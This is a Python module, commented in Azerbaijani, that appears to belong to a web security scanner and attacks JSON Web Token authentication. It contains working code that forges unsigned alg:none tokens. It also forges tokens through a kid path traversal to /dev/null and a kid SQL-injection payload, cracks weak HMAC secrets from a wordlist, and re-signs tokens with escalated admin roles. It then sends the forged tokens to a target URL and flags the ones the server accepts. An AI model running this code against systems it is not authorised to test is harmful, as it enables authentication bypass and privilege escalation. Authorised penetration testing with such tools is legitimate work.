"""
JWT Manipulation Module v3 — Validator, dedup, daha geniş hücum səthi
"""

import asyncio
import base64
import json
import hmac
import hashlib
from typing import Optional

import jwt as pyjwt
from rich.console import Console

from config import JWT_WEAK_SECRETS, JWT_ROLE_ESCALATION_VALUES, FORBIDDEN_CODES
from modules.http_client import AsyncClient, ScanConfig
from modules.validator import ResponseValidator, Deduplicator

console = Console()


# ── Token əməliyyatları ───────────────────────────────────────────────────────

def _b64d(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def _enc(obj: dict) -> str:
    return _b64e(json.dumps(obj, separators=(",", ":")).encode())

def decode_unsafe(token: str) -> tuple[dict, dict]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}, {}
        return json.loads(_b64d(parts[0])), json.loads(_b64d(parts[1]))
    except Exception:
        return {}, {}

def forge_none(payload: dict) -> str:
    """alg:none — imzasız token."""
    return f"{_enc({'alg':'none','typ':'JWT'})}.{_enc(payload)}."

def forge_hs(payload: dict, secret: str, alg: str = "HS256") -> Optional[str]:
    try:
        return pyjwt.encode(payload, secret, algorithm=alg)
    except Exception:
        return None

def forge_kid_null(payload: dict) -> str:
    """kid path traversal → /dev/null → secret boş string."""
    hdr = {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}
    h, p = _enc(hdr), _enc(payload)
    sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64e(sig)}"

def forge_kid_sqli(payload: dict) -> str:
    """kid SQLi — bəzi framework-lər kid-i DB-yə sorğu üçün istifadə edir."""
    hdr = {"alg": "HS256", "typ": "JWT",
           "kid": "' UNION SELECT 'hacked' -- "}
    h, p = _enc(hdr), _enc(payload)
    sig = hmac.new(b"hacked", f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64e(sig)}"

def escalate_payloads(payload: dict) -> list[tuple[str, dict]]:
    """Rol eskalasiya mutasiyalarının siyahısı."""
    results = []
    # Mövcud rol açarlarını tap
    existing = {k: v for k, v in payload.items()
                if any(r in k.lower() for r in
                       ["role", "admin", "perm", "scope", "group", "priv", "level", "access"])}
    for mut in JWT_ROLE_ESCALATION_VALUES:
        results.append((str(mut), {**payload, **mut}))
    for k in existing:
        results.append((f"{k}=admin", {**payload, k: "admin"}))
        results.append((f"{k}=true",  {**payload, k: True}))
    return results

def crack_secret(token: str) -> Optional[str]:
    header, _ = decode_unsafe(token)
    alg = header.get("alg", "HS256")
    if not alg.startswith("HS"):
        return None
    for secret in JWT_WEAK_SECRETS:
        try:
            pyjwt.decode(token, secret, algorithms=[alg])
            return secret
        except pyjwt.InvalidSignatureError:
            continue
        except Exception:
            continue
    return None


# ── Əsas modul ───────────────────────────────────────────────────────────────

async def test_jwt(url: str, token: str, client: AsyncClient, cfg: ScanConfig) -> list[dict]:
    results = []
    lock    = asyncio.Lock()
    dedup   = Deduplicator()

    if not token or not token.strip().startswith("eyJ"):
        console.print("[yellow][~] JWT: etibarlı token yoxdur[/yellow]")
        return results

    header, payload = decode_unsafe(token)
    if not payload:
        console.print("[red][-] JWT: token decode edilə bilmədi[/red]")
        return results

    alg = header.get("alg", "HS256")
    console.print(f"[cyan][*] JWT header:  {json.dumps(header)}[/cyan]")
    console.print(f"[cyan][*] JWT payload: {json.dumps(payload)}[/cyan]")

    # Baseline
    base_hdrs = {**cfg.build_headers(""), "Authorization": f"Bearer {token}"}
    baseline  = await client.get(url, base_hdrs, allow_redirects=True)
    if not baseline:
        console.print(f"[red][-] JWT: {url} əlçatan deyil[/red]")
        return results

    bs = baseline.status
    console.print(f"[cyan][*] JWT baseline: {bs}[/cyan]")
    validator = ResponseValidator(bs, baseline.body, baseline.headers)

    async def probe(forged: Optional[str], attack: str, desc: str):
        if not forged:
            return
        hdrs = {**cfg.build_headers(""), "Authorization": f"Bearer {forged}"}
        resp = await client.get(url, hdrs, allow_redirects=True)
        if not resp:
            return

        if cfg.verbose:
            console.print(f"  [dim]{attack} → {resp.status}[/dim]")

        # Validator ilə yoxla
        vr = validator.validate(resp.status, resp.body, resp.headers, mode="generic")
        if not vr.valid:
            return

        # Status fərqi OLMALI — ya BS forbidden idi, ya da status dəyişdi
        if resp.status == bs and bs not in FORBIDDEN_CODES:
            # Eyni status — yalnız admin keyword-lər varsa flag
            if not any(kw in resp.body.lower()
                       for kw in ["admin", "superuser", "root", "is_admin", "privilege"]):
                return

        sev = "CRITICAL" if resp.status in {200, 201} else "HIGH"
        finding = {
            "type":     "JWT Attack",
            "severity": sev,
            "url":      url,
            "attack":   attack,
            "status":   resp.status,
            "baseline": bs,
            "reason":   desc,
            "snippet":  resp.body[:500],
        }
        if dedup.is_new(finding):
            console.print(f"  [bold red][!] JWT [{attack}]: {resp.status}[/bold red]")
            async with lock:
                results.append(finding)

    tasks = []

    # Hücum 1: alg:none
    console.print("[cyan][*] JWT: alg:none testi...[/cyan]")
    tasks.append(probe(forge_none(payload), "alg:none",
                       "Server imzasız JWT qəbul etdi (alg:none)"))
    for label, mutated in escalate_payloads(payload):
        tasks.append(probe(forge_none(mutated), f"alg:none+{label}",
                           f"alg:none + rol eskalasiyası: {label}"))

    # Hücum 2: kid traversal
    if alg.startswith("HS"):
        tasks.append(probe(forge_kid_null(payload), "kid:/dev/null",
                           "kid path traversal → HMAC secret boş string"))
        tasks.append(probe(forge_kid_sqli(payload), "kid:SQLi",
                           "kid header-də SQL injection cəhdi"))

    # Bütün bu hücumları eyni vaxtda icra et
    await asyncio.gather(*tasks)

    # Hücum 3: Secret crack (sinxron — executor-da)
    console.print("[cyan][*] JWT: secret sındırılır...[/cyan]")
    secret = await asyncio.get_event_loop().run_in_executor(None, crack_secret, token)

    if secret is not None:
        console.print(f"[bold red][!] JWT secret sındırıldı: '{secret}'[/bold red]")
        async with lock:
            results.append({
                "type":     "JWT Weak Secret",
                "severity": "CRITICAL",
                "url":      url,
                "attack":   "Weak Secret",
                "status":   None,
                "baseline": bs,
                "reason":   f"JWT zəif secret ilə imzalanıb: '{secret}'",
                "snippet":  "",
            })

        # Secret ilə rol eskalasiyası
        esc_tasks = []
        for label, mutated in escalate_payloads(payload):
            forged = forge_hs(mutated, secret, alg)
            esc_tasks.append(probe(
                forged,
                f"SecretEsc({label})",
                f"Sındırılmış '{secret}' secret ilə rol eskalasiyası: {label}",
            ))
        await asyncio.gather(*esc_tasks)

    return results
